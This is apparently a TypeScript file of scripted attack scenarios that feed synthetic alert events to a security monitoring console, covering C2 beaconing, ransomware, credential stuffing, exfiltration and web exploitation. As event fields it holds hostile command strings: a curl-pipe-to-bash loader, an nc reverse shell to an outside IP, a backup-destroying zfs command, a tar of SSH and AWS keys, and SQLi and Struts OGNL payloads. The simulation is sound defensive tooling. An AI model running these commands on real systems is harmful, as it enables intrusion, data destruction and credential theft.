import { randomUUID } from "node:crypto";
import type { Protocol, SecurityEvent, Severity } from "@aisoc/shared";

/**
 * Scripted attack scenarios.
 *
 * The background emitter produces plausible but independent events; these are
 * the opposite — ordered sequences where the interesting property is the shape
 * across events, not any single one. They exist so the behavioural heuristics
 * (beacon regularity, mass file writes, cumulative egress, attempt bursts) and
 * incident correlation have something real to find, and so every feature in the
 * console is demonstrable within a minute of starting it.
 */

export type ScenarioStep = {
  /** Milliseconds after the scenario starts. */
  at: number;
  event: Omit<SecurityEvent, "id" | "ts" | "source" | "scenario">;
};

export type Scenario = {
  id: string;
  name: string;
  description: string;
  /** Roughly how often this scenario should recur, relative to the others. */
  weight: number;
  steps: ScenarioStep[];
};

const base = {
  proto: "TCP" as Protocol,
  direction: "to_server" as const,
  bytesToServer: 1_400,
  bytesToClient: 0,
};

// --- C2 beaconing -----------------------------------------------------------

const BEACON_HOST = "192.0.2.32";
const BEACON_C2 = "45.155.205.233";

function beaconSteps(): ScenarioStep[] {
  const steps: ScenarioStep[] = [
    {
      at: 0,
      event: {
        ...base,
        srcIp: BEACON_HOST,
        srcPort: 51_204,
        destIp: BEACON_C2,
        destPort: 443,
        appProto: "http",
        signature: "ET MALWARE Cobalt Strike Beacon Observed (HTTP GET)",
        signatureId: 2_028_094,
        category: "Malware Command and Control Activity Detected",
        severity: 1 as Severity,
        tags: ["c2", "cobaltstrike", "beacon"],
        url: "/pixel.gif",
        userAgent: "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        assetId: "host-32",
        processName: "systemd-resolvd",
        processPid: 3_318,
        processPath: "/tmp/.cache/systemd-resolvd",
        parentProcess: "bash",
        user: "sara",
        fileSha256: "3c8a1f6b0e5d29471c6a8f3b5d0e7c249a1b8f6d3e0c5a7b2f9d4e18c6b3a05f",
      },
    },
  ];

  // Six more check-ins on a 45s cadence with ±8% jitter — enough regularity for
  // the beacon heuristic to lock on, enough jitter to be realistic.
  for (let i = 1; i <= 6; i += 1) {
    const jitter = 1 + (Math.random() - 0.5) * 0.16;
    steps.push({
      at: Math.round(i * 4_500 * jitter),
      event: {
        ...base,
        srcIp: BEACON_HOST,
        srcPort: 51_204 + i,
        destIp: BEACON_C2,
        destPort: 443,
        appProto: "http",
        signature: "ET MALWARE Cobalt Strike Beacon Observed (HTTP GET)",
        signatureId: 2_028_094,
        category: "Malware Command and Control Activity Detected",
        severity: 1 as Severity,
        tags: ["c2", "cobaltstrike", "beacon"],
        url: i % 3 === 0 ? "/submit.php?id=8934721" : "/pixel.gif",
        userAgent: "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        assetId: "host-32",
        processName: "systemd-resolvd",
        processPid: 3_318,
        bytesToServer: 900 + Math.floor(Math.random() * 400),
        bytesToClient: 260 + Math.floor(Math.random() * 180),
      },
    });
  }

  steps.push({
    at: 34_000,
    event: {
      ...base,
      srcIp: BEACON_HOST,
      srcPort: 52_006,
      destIp: BEACON_C2,
      destPort: 443,
      appProto: "tls",
      sni: "cdn-telemetry-sync.net",
      signature: "ET MALWARE Observed Malicious SSL Cert (Cobalt Strike CnC)",
      signatureId: 2_028_095,
      category: "Malware Command and Control Activity Detected",
      severity: 1 as Severity,
      tags: ["c2", "cobaltstrike", "tls"],
      assetId: "host-32",
      bytesToServer: 1_800,
      bytesToClient: 3_400,
    },
  });

  return steps;
}

// --- Ransomware -------------------------------------------------------------

const RANSOM_HOST = "192.0.2.51";

function ransomwareSteps(): ScenarioStep[] {
  const steps: ScenarioStep[] = [
    {
      at: 0,
      event: {
        ...base,
        srcIp: RANSOM_HOST,
        srcPort: 44_100,
        destIp: "91.243.59.120",
        destPort: 443,
        appProto: "tls",
        signature: "ET MALWARE Loader Retrieving Second Stage Payload",
        signatureId: 2_035_114,
        category: "A Network Trojan was Detected",
        severity: 1 as Severity,
        tags: ["ransomware", "loader"],
        sni: "cdn-telemetry-sync.net",
        assetId: "host-51",
        processName: "curl -fsSL https://cdn-telemetry-sync.net/p | bash",
        processPid: 8_812,
        parentProcess: "sh",
        user: "root",
        bytesToServer: 1_200,
        bytesToClient: 1_840_000,
      },
    },
    {
      at: 2_500,
      event: {
        ...base,
        srcIp: RANSOM_HOST,
        srcPort: 0,
        destIp: RANSOM_HOST,
        destPort: 0,
        signature: "AISOC HOST Snapshot deletion observed",
        signatureId: 9_100_002,
        category: "Attempted Administrator Privilege Gain",
        severity: 1 as Severity,
        tags: ["ransomware", "recovery-inhibit"],
        assetId: "host-51",
        processName: "zfs destroy -r tank/backup@auto-2026-08-05",
        processPid: 8_840,
        parentProcess: "lockbit.elf",
        user: "root",
        bytesToServer: 0,
        bytesToClient: 0,
      },
    },
    {
      at: 4_000,
      event: {
        ...base,
        srcIp: RANSOM_HOST,
        srcPort: 0,
        destIp: RANSOM_HOST,
        destPort: 0,
        signature: "AISOC HOST Known encryptor binary executed",
        signatureId: 9_100_003,
        category: "A Network Trojan was Detected",
        severity: 1 as Severity,
        tags: ["ransomware", "encryptor"],
        assetId: "host-51",
        processName: "lockbit.elf --nodelete --threads 8",
        processPid: 8_861,
        processPath: "/var/tmp/.x/lockbit.elf",
        parentProcess: "bash",
        user: "root",
        filePath: "/var/tmp/.x/lockbit.elf",
        fileSha256: "9f2b7c4e1a86d35f0b7e4a2c9d81f6350a4e7b2c8d1f9a3e6b0c5d8f2a7e4b19",
        bytesToServer: 0,
        bytesToClient: 0,
      },
    },
  ];

  // The encryptor working through a share: enough writes in a minute for the
  // mass-modification heuristic to fire.
  const shares = ["data", "engineering", "shared", "archive"];
  for (let i = 0; i < 14; i += 1) {
    steps.push({
      at: 5_000 + i * 320,
      event: {
        ...base,
        srcIp: RANSOM_HOST,
        srcPort: 0,
        destIp: RANSOM_HOST,
        destPort: 0,
        signature: "AISOC HOST File written with known ransomware extension",
        signatureId: 9_100_004,
        category: "A Network Trojan was Detected",
        severity: 1 as Severity,
        tags: ["ransomware", "encryptor"],
        assetId: "host-51",
        processName: "lockbit.elf",
        processPid: 8_861,
        user: "root",
        filePath: `/mnt/tank/${shares[i % shares.length]}/q${i}-report.xlsx.lockbit`,
        bytesToServer: 0,
        bytesToClient: 0,
      },
    });
  }

  steps.push({
    at: 10_400,
    event: {
      ...base,
      srcIp: RANSOM_HOST,
      srcPort: 0,
      destIp: RANSOM_HOST,
      destPort: 0,
      signature: "AISOC HOST Ransom note dropped",
      signatureId: 9_100_005,
      category: "A Network Trojan was Detected",
      severity: 1 as Severity,
      tags: ["ransomware"],
      assetId: "host-51",
      processName: "lockbit.elf",
      processPid: 8_861,
      filePath: "/mnt/tank/shared/HOW-TO-DECRYPT.txt",
      bytesToServer: 0,
      bytesToClient: 0,
    },
  });

  return steps;
}

// --- Credential stuffing ----------------------------------------------------

function credentialStuffingSteps(): ScenarioStep[] {
  const steps: ScenarioStep[] = [];
  const source = "5.188.206.18";
  for (let i = 0; i < 11; i += 1) {
    steps.push({
      at: i * 700,
      event: {
        ...base,
        srcIp: source,
        srcPort: 40_000 + i * 13,
        destIp: "192.0.2.14",
        destPort: i % 3 === 0 ? 22 : 443,
        appProto: i % 3 === 0 ? "ssh" : "http",
        signature:
          i % 3 === 0
            ? "ET SCAN SSH BruteForce Login Attempt"
            : "ET WEB_SERVER Repeated Failed Login Attempts",
        signatureId: i % 3 === 0 ? 2_001_219 : 2_019_401,
        category: "Attempted Administrator Privilege Gain",
        severity: 2 as Severity,
        tags: ["bruteforce", "credentials"],
        url: i % 3 === 0 ? undefined : "/api/auth/login",
        userAgent: i % 3 === 0 ? undefined : "python-requests/2.32.3",
        assetId: "host-14",
        bytesToServer: 480,
        bytesToClient: 320,
      },
    });
  }
  steps.push({
    at: 8_400,
    event: {
      ...base,
      srcIp: source,
      srcPort: 40_212,
      destIp: "192.0.2.14",
      destPort: 22,
      appProto: "ssh",
      direction: "to_client",
      signature: "ET SCAN SSH Successful Login After Repeated Failures",
      signatureId: 2_001_220,
      category: "Attempted Administrator Privilege Gain",
      severity: 1 as Severity,
      tags: ["bruteforce", "credentials", "success"],
      assetId: "host-14",
      user: "deploy",
      bytesToServer: 800,
      bytesToClient: 2_100,
    },
  });
  return steps;
}

// --- Exfiltration -----------------------------------------------------------

function exfiltrationSteps(): ScenarioStep[] {
  const steps: ScenarioStep[] = [
    {
      at: 0,
      event: {
        ...base,
        srcIp: "192.0.2.9",
        srcPort: 0,
        destIp: "192.0.2.9",
        destPort: 0,
        signature: "AISOC HOST Credential store accessed",
        signatureId: 9_100_010,
        category: "Attempted Information Leak",
        severity: 1 as Severity,
        tags: ["exfil", "credentials"],
        assetId: "host-9",
        processName: "tar",
        processPid: 12_004,
        parentProcess: "python3",
        user: "root",
        filePath: "/root/.ssh/id_ed25519",
        bytesToServer: 0,
        bytesToClient: 0,
      },
    },
    {
      at: 1_800,
      event: {
        ...base,
        srcIp: "192.0.2.9",
        srcPort: 0,
        destIp: "192.0.2.9",
        destPort: 0,
        signature: "AISOC HOST Archive staged in temporary directory",
        signatureId: 9_100_011,
        category: "Attempted Information Leak",
        severity: 2 as Severity,
        tags: ["exfil", "collection"],
        assetId: "host-9",
        processName: "tar -czf /dev/shm/.staged/keys.tar.gz /root/.ssh /root/.aws",
        processPid: 12_004,
        user: "aisoc",
        filePath: "/dev/shm/.staged/keys.tar.gz",
        fileSha256: "7d1e4a90c3b62f85d0a7e1c4b9f36208d5a2c7e0b4f18d963a0c5e2b7f4a1d86",
        bytesToServer: 0,
        bytesToClient: 0,
      },
    },
  ];

  // Chunked upload: individually unremarkable, collectively over the egress
  // threshold the volume heuristic watches.
  for (let i = 0; i < 6; i += 1) {
    steps.push({
      at: 3_000 + i * 900,
      event: {
        ...base,
        srcIp: "192.0.2.9",
        srcPort: 55_100 + i,
        destIp: "193.35.18.77",
        destPort: 443,
        appProto: "tls",
        sni: "storage-sync-eu.net",
        signature: "ET POLICY Large Outbound Transfer to Uncategorised Destination",
        signatureId: 2_014_002,
        category: "Potential Corporate Privacy Violation",
        severity: 2 as Severity,
        tags: ["exfil"],
        assetId: "host-9",
        bytesToServer: 11_000_000 + Math.floor(Math.random() * 3_000_000),
        bytesToClient: 4_800,
      },
    });
  }

  steps.push({
    at: 9_400,
    event: {
      ...base,
      srcIp: "192.0.2.9",
      srcPort: 43_100,
      destIp: "193.35.18.77",
      destPort: 53,
      proto: "UDP",
      appProto: "dns",
      hostname:
        "aGVsbG8tdGhpcy1pcy1hLXZlcnktbG9uZy1lbmNvZGVkLXBheWxvYWQtbGFiZWw.t.storage-sync-eu.net",
      signature: "ET TROJAN Possible DNS Tunnelling — Oversized Query Label",
      signatureId: 2_027_901,
      category: "A Network Trojan was Detected",
      severity: 1 as Severity,
      tags: ["exfil", "dns-tunnel"],
      assetId: "host-9",
      bytesToServer: 640,
      bytesToClient: 180,
    },
  });

  return steps;
}

// --- Web exploitation -------------------------------------------------------

function webExploitSteps(): ScenarioStep[] {
  return [
    {
      at: 0,
      event: {
        ...base,
        srcIp: "103.108.229.14",
        srcPort: 61_204,
        destIp: "192.0.2.14",
        destPort: 8_080,
        appProto: "http",
        signature: "ET SCAN Web Application Directory Enumeration",
        signatureId: 2_012_001,
        category: "Attempted Information Leak",
        severity: 3 as Severity,
        tags: ["recon", "web"],
        url: "/admin/.git/config",
        userAgent: "gobuster/3.6",
        assetId: "host-14",
        bytesToServer: 620,
        bytesToClient: 410,
      },
    },
    {
      at: 2_200,
      event: {
        ...base,
        srcIp: "103.108.229.14",
        srcPort: 61_310,
        destIp: "192.0.2.14",
        destPort: 8_080,
        appProto: "http",
        signature: "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT",
        signatureId: 2_006_446,
        category: "Web Application Attack",
        severity: 1 as Severity,
        tags: ["sqli", "web", "exploit"],
        url: "/products.php?id=1' UNION SELECT null,version()--",
        userAgent: "sqlmap/1.8#stable",
        assetId: "host-14",
        bytesToServer: 1_100,
        bytesToClient: 2_600,
      },
    },
    {
      at: 4_600,
      event: {
        ...base,
        srcIp: "103.108.229.14",
        srcPort: 61_402,
        destIp: "192.0.2.14",
        destPort: 8_080,
        appProto: "http",
        signature: "ET EXPLOIT Apache Struts OGNL Injection (CVE-2017-5638)",
        signatureId: 2_024_188,
        category: "Attempted Administrator Privilege Gain",
        severity: 1 as Severity,
        tags: ["cve-2017-5638", "rce", "struts", "exploit"],
        url: "/struts2-showcase/index.action",
        userAgent: "%{(#_='multipart/form-data').(#cmd='id')}",
        assetId: "host-14",
        bytesToServer: 2_400,
        bytesToClient: 890,
      },
    },
    {
      at: 6_100,
      event: {
        ...base,
        srcIp: "192.0.2.14",
        srcPort: 0,
        destIp: "192.0.2.14",
        destPort: 0,
        signature: "AISOC HOST Shell spawned by web server process",
        signatureId: 9_100_020,
        category: "Attempted Administrator Privilege Gain",
        severity: 1 as Severity,
        tags: ["webshell", "rce"],
        assetId: "host-14",
        processName: "bash -i",
        processPid: 21_045,
        parentProcess: "java -jar struts-showcase.jar",
        user: "tomcat",
        bytesToServer: 0,
        bytesToClient: 0,
      },
    },
    {
      at: 7_800,
      event: {
        ...base,
        srcIp: "192.0.2.14",
        srcPort: 39_112,
        destIp: "89.248.165.201",
        destPort: 4_444,
        appProto: "tls",
        signature: "ET MALWARE Reverse Shell Connection Established",
        signatureId: 2_035_220,
        category: "A Network Trojan was Detected",
        severity: 1 as Severity,
        tags: ["c2", "reverse-shell"],
        assetId: "host-14",
        processName: "nc -e /bin/bash 89.248.165.201 4444",
        processPid: 21_048,
        parentProcess: "bash",
        bytesToServer: 3_100,
        bytesToClient: 1_450,
      },
    },
  ];
}

export const SCENARIOS: Scenario[] = [
  {
    id: "c2-beacon",
    name: "Cobalt Strike beaconing",
    description:
      "An implant on the roaming laptop checking in to a known team server every ~45s, then falling back to a TLS channel.",
    weight: 3,
    steps: beaconSteps(),
  },
  {
    id: "ransomware",
    name: "Ransomware on the NAS",
    description:
      "Loader pulled over HTTPS, snapshots destroyed, then bulk encryption across four shares and a ransom note.",
    weight: 2,
    steps: ransomwareSteps(),
  },
  {
    id: "credential-stuffing",
    name: "Credential stuffing against the build server",
    description:
      "A rotating proxy replaying breached credentials against SSH and the API, ending in one successful login.",
    weight: 3,
    steps: credentialStuffingSteps(),
  },
  {
    id: "exfiltration",
    name: "Credential theft and staged exfiltration",
    description:
      "SSH and cloud credentials archived to /dev/shm, uploaded in chunks, with a DNS tunnel as the backup channel.",
    weight: 2,
    steps: exfiltrationSteps(),
  },
  {
    id: "web-exploit",
    name: "Web exploitation to reverse shell",
    description:
      "Directory enumeration, SQLi probing, Struts OGNL RCE, a shell under the web server, and an outbound reverse shell.",
    weight: 2,
    steps: webExploitSteps(),
  },
];

/** Materialises one scenario run: fresh ids and timestamps anchored to now. */
export function instantiate(
  scenario: Scenario,
  startedAt = Date.now(),
): {
  delayMs: number;
  event: SecurityEvent;
}[] {
  return scenario.steps.map((step) => ({
    delayMs: step.at,
    event: {
      ...step.event,
      id: randomUUID(),
      ts: new Date(startedAt + step.at).toISOString(),
      source: "seed",
      scenario: scenario.id,
    },
  }));
}
